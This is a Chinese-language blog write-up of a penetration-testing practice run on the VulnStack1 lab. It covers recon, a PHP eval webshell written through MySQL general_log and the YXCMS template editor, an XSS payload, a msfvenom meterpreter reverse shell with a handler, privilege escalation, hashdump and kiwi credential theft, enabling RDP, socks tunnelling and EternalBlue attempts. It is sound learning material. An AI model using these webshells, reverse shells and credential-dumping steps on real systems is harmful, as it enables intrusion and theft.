---
title: 红日靶场 VulnStack1 渗透学习记录
date: '2022/10/14 08:30:01'
categories:
  - - 渗透靶场练习
description: 学习渗透测试的基本流程，同时进行记录
tags:
abbrlink:
---

[toc]

# 红日靶场 VulnStack1 渗透学习记录

## 靶场搭建

### 搭建流程
解压得到的文件里面的 .vmx 后缀文件，能直接用 VMVare 打开，初始的密码都是：hongrisec@2019

借用一下大佬的图，[图片来源](https://blog.csdn.net/m0_46363249/article/details/121441832)
![img](https://testingcf.jsdelivr.net/gh/black-and-while/save_image/penetration_test/VulnStack1/VulnStack1_1.png)


从上图可以看到，Win7 充当边界服务器，需要有内网和外网两个网卡

先给 Win7 添加网卡：在 VMware 中，右选中虚拟机，点 “设置”，添加 “网络适配器”
Win7 的第一个网卡选择 “自定义 - VMnet1（仅主机模式）”，第二个网卡选择 “NAT模式”
Win2003、Win2008 的网络适配器设置成 “自定义 - VMnet1（仅主机模式）”

因为密码过期了，Win2003、Win2008密码修改如下；
```
Win2003：!Win20082022
Win2008：!Win20032022
```

查看各虚拟机的 IP 地址，情况如下
Win7：192.168.136.148（外）、192.168.52.143（内）
Win2003：192.168.52.141
Win2008：192.168.52.138

验证一下网络联通性：分别用三台虚拟机 ping 一下百度，发现 Win7 可以访问外网，Win2003 和 Win2008 不能访问外网

在 Win7 的 C 盘中打开 phpstudy 启动 web 服务

访问 192.168.136.148，可以访问到 php 探针（Win7 需要关闭防火墙，主机才能访问）

### 可能出现的报错
出现 “phpstudy 已经停止工作” 的情况，报错信息如下
```
Exception EReadError in module phpStudy.exe at 0002D806.Error reading CoolTraylcon1.Visible: Cannot create shellnotification icon.
```

参考这个[做法](https://blog.csdn.net/qq_43871179/article/details/125307581)

需要先启动 Apache 服务
进入 C:\phpStudy\Apache\bin 目录，输入下面的命令
```
httpd.exe -k install
 
httpd.exe -k -n apache2.4
```
这里我又报错了，所以我直接在服务那里启动 Apache 服务

然后需要启动 Mysql 服务
进入 C:\phpStudy\MySQL\bin 目录，输入下面的命令
```
mysqld --defaults-file="C:/phpStudy/mysql/my.ini" --console --skip-grant-tables
```

访问 192.168.136.148，这样就可以访问到 php 探针了（Win7 需要关闭防火墙，主机才能访问）

## 渗透过程

### 攻击 web 服务器

也就是攻击 Win7

#### 信息收集

得到站点之后先要拿到 IP，不过这里我们已经知道是 192.168.136.148 了

使用 kali 里面的 nmap 扫描一下，结果如下

![img](https://testingcf.jsdelivr.net/gh/black-and-while/save_image/penetration_test/VulnStack1/VulnStack1_2.png)

可以看到开放了 80、3306 等

然后用 dirsearch 扫描一下后台路径，结果如下

![img](https://testingcf.jsdelivr.net/gh/black-and-while/save_image/penetration_test/VulnStack1/VulnStack1_3.png)

这里能扫描出来 phpinfo.php、phpmyadmin

用御剑好像还能扫出来一个 beifen.rar 备份文件（这里懒就没扫）

下载查看beifen.rar，打开 robots.txt文件，内容如下
```
#
# robots.txt for YXCMS
#
User-agent: * 
Disallow: /data
Disallow: /protected
```

发现有 yxcms，于是尝试访问 /yxcms，发现确实存在该页面


#### 对 phpadmin 攻击

访问 /phpmyadmin，尝试弱口令，发现 root/root 可以登录

接下来尝试利用 sql 注入写马

##### 尝试 into outfile 写马

利用条件：
1. 知道网站的绝对路径
2. secure_file_priv 不能为 null（当为 “null” 时，不允许导入导出文件；当为 “空” 时，允许导入导出任意文件；当为 “D:\” 时，允许在 D 盘下导入导出）
3. 具有写入文件的权限

利用模糊匹配进行查询
```sql
SHOW GLOBAL VARIABLES LIKE "%secure_file_priv%"
```

结果如下

![img](https://testingcf.jsdelivr.net/gh/black-and-while/save_image/penetration_test/VulnStack1/VulnStack1_4.png)

secure_file_priv 的值为 NULL，所以不能用 into outfile 写马

如果修改 secure_file_priv 的值，也可以写马：
```
windows 下修改配置文件：mysql.ini
linux 修改配置文件：my.cnf
```

##### 尝试利用日志写马

这里使用普通日志写马，也可以用慢日志写马（如果查询时间超过了设置的时间值，默认为10秒，这个查询语句将被记录到慢查询日志中）

数据库都有一个存放日志的文件，但是这个文件会记录数据库的操作语句，也可能不会记录数据库的操作语句，这取决于两个全局变量：

```general_log```：日志的保存状态，ON代表开启 OFF代表关闭
```general_log_file```：日志的保存路径

使用模糊匹配查询全局变量
```sql
show global variables like "%general%"  
```

![img](https://testingcf.jsdelivr.net/gh/black-and-while/save_image/penetration_test/VulnStack1/VulnStack1_5.png)

可以看到 general_log 是 OFF 的状态

打开日志记录
```sql
SET GLOBAL general_log='ON'; 
```

查看SQL安装的绝对路径
```sql
select @@basedir; 
```

得到是 C:/phpStudy/MySQL/

设置写马的路径
```sql
set global general_log_file='C:\\phpStudy\\WWW\\shell.php';
```

然后写入一句话木马
```sql
select '<?php @eval($_POST['cmd']);?>'
```

虽然会报错，但是木马还是写进去了
![img](https://testingcf.jsdelivr.net/gh/black-and-while/save_image/penetration_test/VulnStack1/VulnStack1_6.png)

#### 攻击 yxcms 后台管理系统

访问 /yxcms/index.php，在右侧的公告信息中直接给出了后台登录方式、账户和密码

访问 /yxcms/index.php?r=admin/index/login，输入给出的 admin/123456

在 “全局设置” - “前台模板” - “管理模板文件” - “新建” 中，直接写入一句话木马

![img](https://testingcf.jsdelivr.net/gh/black-and-while/save_image/penetration_test/VulnStack1/VulnStack1_7.png)

从之前下载 beifen.rar 备份文件，得到比如说 acomment.php 页面的路径，从而得到创建的一句话木马的路径 /yxcms/protected/apps/default/view/default/shell_test.php
![img](https://testingcf.jsdelivr.net/gh/black-and-while/save_image/penetration_test/VulnStack1/VulnStack1_8.png)

#### 留言板页面 xss 漏洞

回到 /yxcms/index.php 页面，在留言板处存在 xss 漏洞
```js
<script>alert('xss')</script>
```
填入 xss 攻击代码，然后提交，显示等待后台管理员审核
![img](https://testingcf.jsdelivr.net/gh/black-and-while/save_image/penetration_test/VulnStack1/VulnStack1_9.png)

如果后台管理员对留言内容进行审核时候，就会触发 xss 漏洞
![img](https://testingcf.jsdelivr.net/gh/black-and-while/save_image/penetration_test/VulnStack1/VulnStack1_10.png)

## 后渗透攻击

在后渗透攻击阶段，我们已经将小马上传到 web 服务器上了，这样就可以用 webshell 管理工具进行下一步渗透了

### 使用 msf 建立对话
这里使用 msf，kali 的 ip 为 192.168.136.131
使用 msf 生成 exe
```shell
msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.136.131 LPORT=1234 -f exe -o run2.exe
```
启动 msf并开启监听

```shell
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set lhost 192.168.136.131
set lport 1234
exploit -j
```

利用蚁剑把 run2.exe 传上去 web 服务器
![img](https://testingcf.jsdelivr.net/gh/black-and-while/save_image/penetration_test/VulnStack1/VulnStack1_11.png)

然后通过虚拟终端执行 run2.exe 

使用```sessions -i```可以看到成功建立了会话

![img](https://testingcf.jsdelivr.net/gh/black-and-while/save_image/penetration_test/VulnStack1/VulnStack1_12.png)

### 进行提权

进入第 1 个会话
```shell
sessions -i 1
```

使用命令 ```getsystem```，拿到 system 权限

![img](https://testingcf.jsdelivr.net/gh/black-and-while/save_image/penetration_test/VulnStack1/VulnStack1_13.png)

### 获取账号和 hash 密码

导入账号，密码hash值
```shell
run hashdump
```

![img](https://testingcf.jsdelivr.net/gh/black-and-while/save_image/penetration_test/VulnStack1/VulnStack1_14.png)

Windows系统下的hash密码格式为：
用户名称:RID:LM-HASH值:NT-HASH值

### 获取明文密码

（1）尝试加载 mimikatz 模块，加载模块前需要先将 meterpreter 迁移到 64 位的进程（也就是把当前的进程转移到一个 64 位进程上面），该进程也需要是 system 权限，操作如下：
```shell
ps
migrate PID
```

使用 ```ps``` 可以查看活跃进程

```
PID   PPID  Name               Arch  Session  User                          Path
---   ----  ----               ----  -------  ----                          ----
0     0     [System Process]
4     0     System             x64   0
252   4     smss.exe           x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
296   488   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
304   3992  cmd.exe            x86   1        GOD\Administrator             C:\Windows\SysWOW64\cmd.exe
316   1184  run2.exe           x86   1        GOD\Administrator             C:\phpStudy\WWW\run2.exe
************************************************************************************************************
************************************************************************************************************
944   488   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
956   3720  run2.exe           x86   1        GOD\Administrator             C:\phpStudy\WWW\run2.exe
964   2776  cmd.exe            x64   1        GOD\Administrator             C:\Windows\system32\cmd.exe
1156  488   spoolsv.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
************************************************************************************************************
************************************************************************************************************
```

这里 ```migrate 964``` 迁移到 64 位的 cmd.exe 上

再执行 ```load mimikatz``` 命令
```shell
load kiwi
```
注意事项：
1. 32位系统直接加载模块，然后使用命令 ```mimikatz_command -f sekurlsa::searchPasswords```
2. 64位系统先迁移 meterpreter 到 64 位的进程中，再加载模块

![img](https://testingcf.jsdelivr.net/gh/black-and-while/save_image/penetration_test/VulnStack1/VulnStack1_15.png)

发现报错，显示 ```mimikatz``` 已经被 ```kiwi``` 取代

（2）换成加载 kiwi 模块
注意事项：64 位系统时候，也需要先迁移到 64 位的进程中，再加载模块

迁移后，执行 ```load kiwi``` 命令加载，然后 ```creds_all```
```shell
load kiwi
creds_all
```

![img](https://testingcf.jsdelivr.net/gh/black-and-while/save_image/penetration_test/VulnStack1/VulnStack1_16.png)

可以看到已经成功得到明文密码

### 开启 3389 端口

3389 端口是 Windows Server 系统远程桌面的服务端口

```shell
run post/windows/manage/enable_rdp
```

再用 nmap 扫描一下，可以看到确实是开放了 3389 端口
![img](https://testingcf.jsdelivr.net/gh/black-and-while/save_image/penetration_test/VulnStack1/VulnStack1_17.png)

## 横向移动

### 搭建隧道

隧道是一种绕过端口屏蔽的通信方式。
这里使用 msf + proxychains 进行搭建

用msf直接搭建sock隧道
进入session，自动创建路由
```shell
run post/multi/manage/autoroute
```
![img](https://testingcf.jsdelivr.net/gh/black-and-while/save_image/penetration_test/VulnStack1/VulnStack1_18.png)

查看路由
```shell
run autoroute -p
```
![img](https://testingcf.jsdelivr.net/gh/black-and-while/save_image/penetration_test/VulnStack1/VulnStack1_19.png)

退到上层，添加 socks 代理，端口与 proxychains 里设置一致即可
```shell
background
use auxiliary/server/socks_proxy
```

看一下所需参数情况

```shell
show options
```

![img](https://testingcf.jsdelivr.net/gh/black-and-while/save_image/penetration_test/VulnStack1/VulnStack1_20.png)

设置参数
```shell
set username admin
set password admin
show options
run
```

![img](https://testingcf.jsdelivr.net/gh/black-and-while/save_image/penetration_test/VulnStack1/VulnStack1_21.png)


然后执行
```shell
run
```
![img](https://testingcf.jsdelivr.net/gh/black-and-while/save_image/penetration_test/VulnStack1/VulnStack1_22.png)

这里我打开一个新的终端，安装 proxychains
```shell
sudo apt-get install proxychains
```

然后修改 proxychains 的配置文件 /etc/proxychains.conf
```
sudo vim /etc/proxychains.conf
```

修改 ```[ProxyList]```，其中的端口要与 msf 中的模块的端口设置相同

![img](https://testingcf.jsdelivr.net/gh/black-and-while/save_image/penetration_test/VulnStack1/VulnStack1_23.png)

### 内网信息收集

使用 msf 内置模块进行存活主机探测（时间非常长）
```shell
auxiliary/scanner/discovery/udp_sweep    #基于udp协议发现内网存活主机
auxiliary/scanner/discovery/udp_probe    #基于udp协议发现内网存活主机
auxiliary/scanner/netbios/nbname         #基于netbios协议发现内网存活主机
```
![img](https://testingcf.jsdelivr.net/gh/black-and-while/save_image/penetration_test/VulnStack1/VulnStack1_26.png)

使用 ```auxiliary/scanner/discovery/udp_sweep``` 扫描结果如下
![img](https://testingcf.jsdelivr.net/gh/black-and-while/save_image/penetration_test/VulnStack1/VulnStack1_27.png)

发现了 192.168.52.143（win7）、192.168.52.141（win2003）、192.16	8.52.138（win2008）主机

也可以使用 proxychains 代理 nmap 进行端口扫描（时间非常长）
```shell
proxychains nmap -Pn -sT 192.168.52.141
```

![img](https://testingcf.jsdelivr.net/gh/black-and-while/save_image/penetration_test/VulnStack1/VulnStack1_24.png)
![img](https://testingcf.jsdelivr.net/gh/black-and-while/save_image/penetration_test/VulnStack1/VulnStack1_25.png)

### 尝试控制域内其他主机

既然是 win7，直接用 MS17-010(445），也就是永恒之蓝打一波

先扫描一波看看有没有
```shell
use auxiliary/scanner/smb/smb_ms17_010
set rhost 192.168.52.141
run
```

结果如下
![img](https://testingcf.jsdelivr.net/gh/black-and-while/save_image/penetration_test/VulnStack1/VulnStack1_28.png)

然后尝试攻击
```shell
use exploit/windows/smb/ms17_010_eternalblue
set rhost 192.168.52.141
run
```
结果如下
![img](https://testingcf.jsdelivr.net/gh/black-and-while/save_image/penetration_test/VulnStack1/VulnStack1_29.png)

这里攻击失败了，因为目标机是 32 位系统，而 MSF 内置的漏洞是 64 位的，不过可以参考这个[攻击](https://blog.csdn.net/qq_41617034/article/details/91051614)

后面对 win2008（64位）的攻击也没有生效，可能是有些别的因素影响生效
